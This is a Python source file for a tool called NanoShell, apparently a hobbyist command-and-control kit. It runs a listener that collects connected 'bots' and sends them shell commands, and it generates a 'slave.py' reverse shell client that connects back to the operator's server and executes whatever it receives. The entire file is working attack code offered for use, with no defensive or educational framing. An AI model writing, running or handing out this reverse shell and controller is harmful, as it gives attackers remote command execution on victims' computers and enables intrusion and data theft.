import os
from time import sleep


def banner():
    print('''
 /$$   /$$                                /$$$$$$  /$$                 /$$ /$$
| $$$ | $$                               /$$__  $$| $$                | $$| $$
| $$$$| $$  /$$$$$$  /$$$$$$$   /$$$$$$ | $$  \__/| $$$$$$$   /$$$$$$ | $$| $$
| $$ $$ $$ |____  $$| $$__  $$ /$$__  $$|  $$$$$$ | $$__  $$ /$$__  $$| $$| $$
| $$  $$$$  /$$$$$$$| $$  \ $$| $$  \ $$ \____  $$| $$  \ $$| $$$$$$$$| $$| $$
| $$\  $$$ /$$__  $$| $$  | $$| $$  | $$ /$$  \ $$| $$  | $$| $$_____/| $$| $$
| $$ \  $$|  $$$$$$$| $$  | $$|  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$| $$
|__/  \__/ \_______/|__/  |__/ \______/  \______/ |__/  |__/ \_______/|__/|__/
 <~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Written By Necro ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>''')


def builder_banner():
    print('''
_________ .__  .__               __              ________                                   __                
\_   ___ \|  | |__| ____   _____/  |_           /  _____/  ____   ____   ________________  /  |_  ___________ 
/    \  \/|  | |  |/ __ \ /    \   __\  ______ /   \  ____/ __ \ /    \_/ __ \_  __ \__  \ |  __\/  _ \_  __  |
\     \___|  |_|  \  ___/|   |  \  |   /_____/ \    \_\  \  ___/|   |  \  ___/|  | \// __ \|  | (  <_> )  | \/
 \______  /____/__|\___  >___|  /__|            \______  /\___  >___|  /\___  >__|  (____  /__|  \____/|__|   
        \/             \/     \/                       \/     \/     \/     \/           \/                   
   Written By Necro
    ''')


def generate_server_banner():
    print('''
 _______                        _________                                
 \      \ _____    ____   ____ |   _____/ ______________  __ ___________ 
 /   |   \|__  \  /    \ /  _ \ \____  \_/ __ \_  __ \  \/ // __ \_  __  |
/    |    \/ __ \|   |  (  <_> )        \  ___/|  | \/\   /\  ___/|  | \/
\____|__  (____  /___|  /\____/_______  /\___  >__|    \_/  \___  >__|   
        \/     \/     \/              \/     \/                 \/       
    Written By Necro
    ''')


def server_banner():
    print('''
 ▐ ▄  ▄▄▄·  ▐ ▄       .▄▄ · ▄▄▄ .▄▄▄   ▌ ▐·▄▄▄ .▄▄▄  
•█▌▐█▐█ ▀█ •█▌▐█▪     ▐█ ▀. ▀▄.▀·▀▄ █·▪█·█▌▀▄.▀·▀▄ █·
▐█▐▐▌▄█▀▀█ ▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐█▐█•▐▀▀▪▄▐▀▀▄ 
██▐█▌▐█ ▪▐▌██▐█▌▐█▌.▐▌▐█▄▪▐█▐█▄▄▌▐█•█▌ ███ ▐█▄▄▌▐█•█▌
▀▀ █▪ ▀  ▀ ▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  ▀▀▀ .▀  ▀. ▀   ▀▀▀ .▀  ▀
C&C By Necro
''')


def generate_server():
    import datetime
    import socket
    import threading
    from datetime import datetime
    from queue import Queue

    NUMBER_OF_THREADS = 2
    JOB_NUMBER = [1, 2]
    queue = Queue()
    all_connections = []
    all_address = []
    host = input('Server IP: ')
    port = int(input('Server Port: '))
    os.system('cls')
    server_banner()
    print(f'[+] Config: {host}:{port}')
    print(f'[+] Starting Server... ')
    s = socket.socket()

    def help_message():
        print('''
            --------------------------------------------------------------------
            Usage:
            --------------------------------------------------------------------
            ~ Nano$hell> list
            ~ Example Output:
            ~ 0 Slave-1 Port
            ~ 1 Slave-2 Port
            ~ 2 Slave-3 Port
            ~ Select Client:
            ~ Nano$hell> select 1
            ~ 192.168.0.112> dir
            --------------------------------------------------------------------
            ''')

    def bind_socket():
        try:
            bind_time = datetime.now()
            print("[+] Binding host to: " + str(port) + f"At: {bind_time}")
            s.bind((host, port))
            s.listen(5)
            print(f"[+] Listening for client connection on: {host}:{port}")

        except socket.error as msg:
            bind_time = datetime.now()
            print(f"[!] {bind_time}: Socket Binding error {msg} \nRetrying...")
            bind_socket()

    def accepting_connections():
        for c in all_connections:
            c.close()

        del all_connections[:]
        del all_address[:]

        while True:
            try:
                conn, address = s.accept()
                s.setblocking(True)

                all_connections.append(conn)
                all_address.append(address)

                print("[+] Connection has been established: " + address[0])

            except socket.error:
                print("[!] Error accepting connections")

    def start_server():
        while True:
            cmd = input('Nano$hell> ')
            if cmd == 'list':
                list_connections()

            elif cmd == 'quit' or cmd == 'exit':
                print('[+] Goodbye! ')
                exit()

            elif cmd == 'help':
                help_message()

            elif 'select' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_commands(conn)

            else:
                print("[!] Error: Command not recognized")
                start_server()

    def list_connections():
        results = ''
        client_time = datetime.now()

        for i, conn in enumerate(all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except socket.error:
                del all_connections[i]
                del all_address[i]
                continue

            results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n\n" + str(
                client_time) + "\n"

        print("- - - - BOTS - - - -" + "\n" + results)

    def get_target(cmd):
        try:
            target = cmd.replace('select ', '')
            target = int(target)
            conn = all_connections[target]
            print("[+] You are now connected to :" + str(all_address[target][0]))
            print(str(all_address[target][0]) + ">", end="")
            return conn
            # 192.168.0.4> dir

        except socket.error:
            print("[!] Invalid Selection")
            return None

    def send_target_commands(conn):
        while True:
            try:
                cmd = input()
                if cmd == 'quit':
                    conn.close()
                    exit()

                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")

            except socket.error as e:
                print(f"[!] Socket Error: {e}")
                break

    def create_workers():
        for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target=work)
            t.daemon = True
            t.start()

    def work():
        while True:
            x = queue.get()
            if x == 1:
                bind_socket()
                accepting_connections()
            if x == 2:
                start_server()

            queue.task_done()

    def create_jobs():
        for x in JOB_NUMBER:
            queue.put(x)

        queue.join()

    create_workers()
    create_jobs()


def generate_client():
    builder_banner()
    server = input('Server IP: ')
    server_port = input('Server Port: ')
    script = f'''
import os
import socket
import subprocess


s = socket.socket()
host = '{server}'
port = {server_port}
s.connect((host, port))

while True:
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            print(output_str)

'''
    while True:
        try:
            print(f'[+] Config: {server}:{server_port}')
            print(f'[+] Generating Client... ')
            with open('slave.py', 'w') as f:
                f.write(script)
                f.close()
                print('[+] Client Build Successful')
                exit()
        except OSError as e:
            print(f'[!] Build Failed: {e}')


def options():
    print('''Options:
[1] - Start Server
[2] - Generate Client
    ''')
    choice = input('$~>: ')
    while True:
        if choice == '1':
            os.system('cls')
            generate_server_banner()
            sleep(1)
            os.system('cls')
            generate_server()

        elif choice == '2':
            try:
                generate_client()
                break

            except FileExistsError:
                print('[!] File Already Exists')
                print('[+] Deleting Old File')
                os.system('del slave.py')
                print('[+] Deleted Old Client')
                os.system('cls')
                builder_banner()
                print('[+] Generate New Client')
                generate_client()
                exit()

        else:
            print('[!] Invalid Option')
            break

        options()


def main():
    banner()
    options()


main()
